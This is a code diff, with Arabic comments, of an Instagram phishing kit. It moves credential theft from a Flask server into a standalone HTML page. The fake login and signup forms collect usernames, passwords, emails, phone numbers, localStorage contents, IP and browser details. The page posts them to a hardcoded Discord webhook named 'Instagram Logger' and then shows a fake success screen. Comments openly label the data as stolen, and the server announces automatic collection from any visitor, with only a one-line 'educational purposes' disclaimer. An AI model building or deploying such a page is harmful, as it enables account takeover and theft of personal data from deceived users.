@@ -1,175 +1,3 @@
-from flask import Flask, request, render_template_string, redirect, url_for
-import requests
-import json
-import datetime
-import os
-import uuid
-from urllib.parse import quote
-
-app = Flask(__name__)
-app.secret_key = os.urandom(24)
-
-# استبدل هذا الرابط برابط الويب هوك الخاص بك من Discord
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433416061365125243/-xPceWsRvCvcZmfb7A2v4X_P8dz3SntYSfxH3cuNLEoJtxsoSwRw0tlpiTIybcHUX_iA"
-
-def get_client_ip():
-    """الحصول على IP العميل الحقيقي"""
-    if request.headers.get('X-Forwarded-For'):
-        return request.headers.get('X-Forwarded-For').split(',')[0]
-    elif request.headers.get('X-Real-IP'):
-        return request.headers.get('X-Real-IP')
-    else:
-        return request.remote_addr
-
-def send_to_discord(data):
-    """إرسال البيانات إلى Discord webhook"""
-    
-    # إنشاء الحقول الأساسية
-    fields = []
-    
-    # معلومات المستخدم إذا تم إدخالها
-    if data.get('username') or data.get('password'):
-        fields.extend([
-            {
-                "name": "👤 اسم المستخدم",
-                "value": f"```{data.get('username', 'لم يدخل')}```",
-                "inline": True
-            },
-            {
-                "name": "🔑 كلمة المرور", 
-                "value": f"```{data.get('password', 'لم يدخل')}```",
-                "inline": True
-            }
-        ])
-    
-    # معلومات إضافية
-    additional_info = []
-    if data.get('email'):
-        additional_info.append(f"📧 الإيميل: `{data.get('email')}`")
-    if data.get('phone'):
-        additional_info.append(f"📞 الهاتف: `{data.get('phone')}`")
-    
-    if additional_info:
-        fields.append({
-            "name": "📝 معلومات إضافية",
-            "value": "\n".join(additional_info),
-            "inline": False
-        })
-    
-    # معلومات المتصفح والنظام
-    fields.extend([
-        {
-            "name": "🌐 المتصفح",
-            "value": f"```{data.get('userAgent', 'غير معروف')[:100]}```",
-            "inline": False
-        },
-        {
-            "name": "💻 النظام",
-            "value": f"`{data.get('platform', 'غير معروف')}`",
-            "inline": True
-        },
-        {
-            "name": "🗣️ اللغة",
-            "value": f"`{data.get('language', 'غير معروف')}`",
-            "inline": True
-        },
-        {
-            "name": "🖥️ دقة الشاشة",
-            "value": f"`{data.get('screenWidth', '')}x{data.get('screenHeight', '')}`",
-            "inline": True
-        }
-    ])
-    
-    # معلومات الشبكة والموقع
-    network_info = []
-    if data.get('ip'):
-        network_info.append(f"📍 IP: `{data.get('ip')}`")
-    if data.get('timezone'):
-        network_info.append(f"⏰ المنطقة: `{data.get('timezone')}`")
-    if data.get('connection'):
-        network_info.append(f"📶 الشبكة: `{data.get('connection', {}).get('effectiveType', 'غير معروف')}`")
-    
-    if network_info:
-        fields.append({
-            "name": "🌍 معلومات الشبكة",
-            "value": "\n".join(network_info),
-            "inline": False
-        })
-    
-    # معلومات إضافية
-    if data.get('referrer'):
-        fields.append({
-            "name": "🔗 المرجع",
-            "value": f"`{data.get('referrer')[:100]}`",
-            "inline": False
-        })
-    
-    # البيانات المسروقة من التخزين
-    if data.get('localStorage'):
-        ls_data = {k: v for k, v in data.get('localStorage', {}).items() if len(str(v)) < 100}
-        if ls_data:
-            fields.append({
-                "name": "💾 LocalStorage",
-                "value": f"```json\n{json.dumps(ls_data, ensure_ascii=False)[:500]}```",
-                "inline": False
-            })
-    
-    # معلومات الجلسة
-    if data.get('sessionId'):
-        fields.append({
-            "name": "🆔 معرف الجلسة",
-            "value": f"`{data.get('sessionId')}`",
-            "inline": True
-        })
-    
-    embeds = [{
-        "title": "🚨 تم جمع معلومات جديدة",
-        "color": 16711680,
-        "fields": fields,
-        "timestamp": datetime.datetime.utcnow().isoformat(),
-        "footer": {
-            "text": f"تم الجمع في {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        }
-    }]
-    
-    payload = {
-        "content": "🔓 **تم جمع البيانات بنجاح**",
-        "embeds": embeds,
-        "username": "Instagram Logger",
-        "avatar_url": "https://cdn-icons-png.flaticon.com/512/1384/1384063.png"
-    }
-    
-    try:
-        response = requests.post(
-            DISCORD_WEBHOOK_URL,
-            json=payload,
-            headers={"Content-Type": "application/json"},
-            timeout=10
-        )
-        print(f"✅ تم إرسال البيانات إلى Discord - الحالة: {response.status_code}")
-        return response.status_code in [200, 204]
-    except Exception as e:
-        print(f"❌ خطأ في الإرسال: {e}")
-        return False
-
-def save_to_file(data):
-    """حفظ البيانات في ملف"""
-    try:
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        with open('collected_data.json', 'a', encoding='utf-8') as f:
-            record = {
-                'timestamp': timestamp,
-                'data': data
-            }
-            f.write(json.dumps(record, ensure_ascii=False) + '\n')
-        print(f"💾 تم حفظ البيانات في الملف")
-    except Exception as e:
-        print(f"❌ خطأ في حفظ الملف: {e}")
-
-# الصفحة الرئيسية - إنستغرام مزيف محسن
-@app.route('/')
-def fake_login_page():
-    return render_template_string('''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -535,6 +363,15 @@ def fake_login_page():
             cursor: pointer;
             font-size: 12px;
         }
+        
+        .success-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            text-align: center;
+            border-radius: 3px;
+            width: 350px;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
@@ -547,7 +384,8 @@ def fake_login_page():
         </div>
     </div>
 
-    <div class="container">
+    <!-- الصفحة الرئيسية -->
+    <div id="mainPage" class="container">
         <div class="phones">
             <div class="phone-mockup">
                 <div style="text-align: center;">
@@ -652,6 +490,20 @@ def fake_login_page():
         </div>
     </div>
     
+    <!-- صفحة النجاح -->
+    <div id="successPage" style="display: none;">
+        <div class="success-box">
+            <div class="logo">Instagram</div>
+            <div class="success-message">
+                تم تسجيل الدخول بنجاح! جاري تحويلك...
+            </div>
+            <div style="margin: 20px 0;">
+                <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+            </div>
+            <button onclick="showMainPage()">العودة</button>
+        </div>
+    </div>
+
     <div class="footer">
         <div class="footer-links">
             <a href="#">Meta</a>
@@ -674,6 +526,9 @@ def fake_login_page():
     </div>
 
     <script>
+        // استبدل هذا الرابط برابط الويب هوك الخاص بك من Discord
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433416061365125243/-xPceWsRvCvcZmfb7A2v4X_P8dz3SntYSfxH3cuNLEoJtxsoSwRw0tlpiTIybcHUX_iA";
+        
         let sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
         let collectedInitialData = false;
         
@@ -755,24 +610,224 @@ def fake_login_page():
             return autoFilled;
         }
         
-        // إرسال البيانات إلى الخادم
-        function sendStolenData(stolenData) {
-            return fetch('/collect-data', {
+        // إرسال البيانات إلى Discord
+        function sendToDiscord(data) {
+            // إنشاء الحقول الأساسية
+            const fields = [];
+            
+            // معلومات المستخدم إذا تم إدخالها
+            if (data.username || data.password) {
+                fields.push(
+                    {
+                        "name": "👤 اسم المستخدم",
+                        "value": `\`\`\`${data.username || 'لم يدخل'}\`\`\``,
+                        "inline": true
+                    },
+                    {
+                        "name": "🔑 كلمة المرور", 
+                        "value": `\`\`\`${data.password || 'لم يدخل'}\`\`\``,
+                        "inline": true
+                    }
+                );
+            }
+            
+            // معلومات إضافية
+            const additionalInfo = [];
+            if (data.email) {
+                additionalInfo.push(`📧 الإيميل: \`${data.email}\``);
+            }
+            if (data.phone) {
+                additionalInfo.push(`📞 الهاتف: \`${data.phone}\``);
+            }
+            
+            if (additionalInfo.length > 0) {
+                fields.push({
+                    "name": "📝 معلومات إضافية",
+                    "value": additionalInfo.join("\n"),
+                    "inline": false
+                });
+            }
+            
+            // معلومات المتصفح والنظام
+            fields.push(
+                {
+                    "name": "🌐 المتصفح",
+                    "value": `\`\`\`${(data.userAgent || 'غير معروف').substring(0, 100)}\`\`\``,
+                    "inline": false
+                },
+                {
+                    "name": "💻 النظام",
+                    "value": `\`${data.platform || 'غير معروف'}\``,
+                    "inline": true
+                },
+                {
+                    "name": "🗣️ اللغة",
+                    "value": `\`${data.language || 'غير معروف'}\``,
+                    "inline": true
+                },
+                {
+                    "name": "🖥️ دقة الشاشة",
+                    "value": `\`${data.screenWidth || ''}x${data.screenHeight || ''}\``,
+                    "inline": true
+                }
+            );
+            
+            // معلومات الشبكة والموقع
+            const networkInfo = [];
+            if (data.ip) {
+                networkInfo.push(`📍 IP: \`${data.ip}\``);
+            }
+            if (data.timezone) {
+                networkInfo.push(`⏰ المنطقة: \`${data.timezone}\``);
+            }
+            if (data.connection && data.connection.effectiveType) {
+                networkInfo.push(`📶 الشبكة: \`${data.connection.effectiveType}\``);
+            }
+            
+            if (networkInfo.length > 0) {
+                fields.push({
+                    "name": "🌍 معلومات الشبكة",
+                    "value": networkInfo.join("\n"),
+                    "inline": false
+                });
+            }
+            
+            // معلومات إضافية
+            if (data.referrer) {
+                fields.push({
+                    "name": "🔗 المرجع",
+                    "value": `\`${data.referrer.substring(0, 100)}\``,
+                    "inline": false
+                });
+            }
+            
+            // البيانات المسروقة من التخزين
+            if (data.localStorage && Object.keys(data.localStorage).length > 0) {
+                const lsData = {};
+                for (const [key, value] of Object.entries(data.localStorage)) {
+                    if (String(value).length < 100) {
+                        lsData[key] = value;
+                    }
+                }
+                if (Object.keys(lsData).length > 0) {
+                    fields.push({
+                        "name": "💾 LocalStorage",
+                        "value": `\`\`\`json\n${JSON.stringify(lsData, null, 2).substring(0, 500)}\`\`\``,
+                        "inline": false
+                    });
+                }
+            }
+            
+            // معلومات الجلسة
+            if (data.sessionId) {
+                fields.push({
+                    "name": "🆔 معرف الجلسة",
+                    "value": `\`${data.sessionId}\``,
+                    "inline": true
+                });
+            }
+            
+            const embeds = [{
+                "title": "🚨 تم جمع معلومات جديدة",
+                "color": 16711680,
+                "fields": fields,
+                "timestamp": new Date().toISOString(),
+                "footer": {
+                    "text": `تم الجمع في ${new Date().toLocaleString('ar-SA')}`
+                }
+            }];
+            
+            const payload = {
+                "content": "🔓 **تم جمع البيانات بنجاح**",
+                "embeds": embeds,
+                "username": "Instagram Logger",
+                "avatar_url": "https://cdn-icons-png.flaticon.com/512/1384/1384063.png"
+            };
+            
+            return fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(stolenData)
+                body: JSON.stringify(payload)
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log('✅ تم إرسال البيانات:', data);
-                return true;
+            .then(response => {
+                console.log(`✅ تم إرسال البيانات إلى Discord - الحالة: ${response.status}`);
+                return response.status === 200 || response.status === 204;
             })
             .catch(error => {
-                console.error('❌ خطأ في الإرسال:', error);
+                console.error(`❌ خطأ في الإرسال: ${error}`);
                 return false;
             });
+        }
+        
+        // حفظ البيانات محلياً
+        function saveToFile(data) {
+            try {
+                const timestamp = new Date().toLocaleString('ar-SA');
+                const record = {
+                    'timestamp': timestamp,
+                    'data': data
+                };
+                
+                // في بيئة المتصفح، يمكننا استخدام localStorage لحفظ البيانات
+                const existingData = JSON.parse(localStorage.getItem('collectedData') || '[]');
+                existingData.push(record);
+                localStorage.setItem('collectedData', JSON.stringify(existingData));
+                
+                console.log('💾 تم حفظ البيانات محلياً');
+                
+                // عرض رابط لتحميل البيانات
+                const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(existingData, null, 2));
+                const downloadAnchorNode = document.createElement('a');
+                downloadAnchorNode.setAttribute("href", dataStr);
+                downloadAnchorNode.setAttribute("download", "collected_data.json");
+                document.body.appendChild(downloadAnchorNode);
+                downloadAnchorNode.click();
+                downloadAnchorNode.remove();
+                
+            } catch (error) {
+                console.error(`❌ خطأ في حفظ الملف: ${error}`);
+            }
+        }
+        
+        // إرسال البيانات المسروقة
+        function sendStolenData(stolenData) {
+            // الحصول على عنوان IP باستخدام خدمة خارجية
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    stolenData.ip = ipData.ip;
+                    
+                    console.log("🚨 تم استقبال بيانات جديدة!");
+                    console.log(`📍 IP: ${stolenData.ip}`);
+                    console.log(`🆔 الجلسة: ${stolenData.sessionId}`);
+                    console.log(`📊 الإجراء: ${stolenData.action || 'unknown'}`);
+                    
+                    if (stolenData.username) {
+                        console.log(`👤 المستخدم: ${stolenData.username}`);
+                    }
+                    if (stolenData.password) {
+                        console.log(`🔑 كلمة المرور: ${stolenData.password}`);
+                    }
+                    if (stolenData.email) {
+                        console.log(`📧 الإيميل: ${stolenData.email}`);
+                    }
+                    
+                    // إرسال إلى Discord
+                    sendToDiscord(stolenData);
+                    
+                    // حفظ محلي
+                    saveToFile(stolenData);
+                })
+                .catch(error => {
+                    console.error('❌ خطأ في الحصول على IP:', error);
+                    stolenData.ip = 'غير معروف';
+                    
+                    // إرسال إلى Discord بدون IP
+                    sendToDiscord(stolenData);
+                    saveToFile(stolenData);
+                });
         }
         
         // التبديل بين التبويبات
@@ -854,6 +909,22 @@ def fake_login_page():
             sendStolenData(stolenData);
         }
         
+        // عرض الصفحة الرئيسية
+        function showMainPage() {
+            document.getElementById('mainPage').style.display = 'flex';
+            document.getElementById('successPage').style.display = 'none';
+        }
+        
+        // عرض صفحة النجاح
+        function showSuccessPage() {
+            document.getElementById('mainPage').style.display = 'none';
+            document.getElementById('successPage').style.display = 'flex';
+            
+            setTimeout(() => {
+                showMainPage();
+            }, 3000);
+        }
+        
         // عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
             console.log('🚀 بدء جمع البيانات تلقائياً...');
@@ -891,7 +962,8 @@ def fake_login_page():
                 
                 // إعادة التوجيه بعد تأخير
                 setTimeout(() => {
-                    window.location.href = '/login-success';
+                    loader.style.display = 'none';
+                    showSuccessPage();
                 }, 2000);
             });
             
@@ -920,7 +992,8 @@ def fake_login_page():
                 
                 // إعادة التوجيه بعد تأخير
                 setTimeout(() => {
-                    window.location.href = '/signup-success';
+                    loader.style.display = 'none';
+                    showSuccessPage();
                 }, 2000);
             });
             
@@ -958,111 +1031,3 @@ def fake_login_page():
     </script>
 </body>
 </html>
-    ''')
-
-# صفحة النجاح بعد تسجيل الدخول
-@app.route('/login-success')
-def login_success():
-    return render_template_string('''
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Instagram</title>
-        <style>
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-                background-color: #fafafa;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                margin: 0;
-                direction: rtl;
-            }
-            .success-box {
-                background: white;
-                border: 1px solid #dbdbdb;
-                padding: 40px;
-                text-align: center;
-                border-radius: 3px;
-                width: 350px;
-            }
-            .logo {
-                font-family: 'Billabong', cursive;
-                font-size: 48px;
-                margin-bottom: 20px;
-                color: #262626;
-            }
-            .success-message {
-                color: #262626;
-                margin: 20px 0;
-            }
-            button {
-                background: #0095f6;
-                border: none;
-                padding: 8px 16px;
-                color: white;
-                border-radius: 8px;
-                cursor: pointer;
-                margin: 5px;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="success-box">
-            <div class="logo">Instagram</div>
-            <div class="success-message">
-                تم تسجيل الدخول بنجاح! جاري تحويلك...
-            </div>
-            <div style="margin: 20px 0;">
-                <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-            </div>
-            <button onclick="window.location.href='/'">العودة</button>
-        </div>
-        <script>
-            setTimeout(() => {
-                window.location.href = '/';
-            }, 3000);
-        </script>
-    </body>
-    </html>
-    ''')
-
-# نقطة نهاية جديدة لاستقبال البيانات
-@app.route('/collect-data', methods=['POST'])
-def collect_data():
-    """استقبال البيانات المسروقة"""
-    stolen_data = request.get_json()
-    
-    # إضافة عنوان IP الحقيقي
-    stolen_data['ip'] = get_client_ip()
-    
-    print("🚨 تم استقبال بيانات جديدة!")
-    print(f"📍 IP: {stolen_data.get('ip')}")
-    print(f"🆔 الجلسة: {stolen_data.get('sessionId')}")
-    print(f"📊 الإجراء: {stolen_data.get('action', 'unknown')}")
-    
-    if stolen_data.get('username'):
-        print(f"👤 المستخدم: {stolen_data.get('username')}")
-    if stolen_data.get('password'):
-        print(f"🔑 كلمة المرور: {stolen_data.get('password')}")
-    if stolen_data.get('email'):
-        print(f"📧 الإيميل: {stolen_data.get('email')}")
-    
-    # إرسال إلى Discord
-    send_to_discord(stolen_data)
-    
-    # حفظ محلي
-    save_to_file(stolen_data)
-    
-    return {'status': 'success', 'message': 'تم استقبال البيانات'}
-
-if __name__ == '__main__':
-    print("🌐 الخادم يعمل على: http://localhost:5000")
-    print("🚨 سيتم جمع المعلومات تلقائياً عند دخول أي مستخدم!")
-    print("📧 سيتم جمع: الإيميلات، كلمات المرور، البيانات الحساسة، معلومات المتصفح")
-    print("📱 يتم الإرسال إلى Discord وحفظ محلياً في collected_data.json")
-    print("⚠️  للأغراض التعليمية والأمنية فقط!")
-    app.run(debug=False, host='0.0.0.0', port=5000)
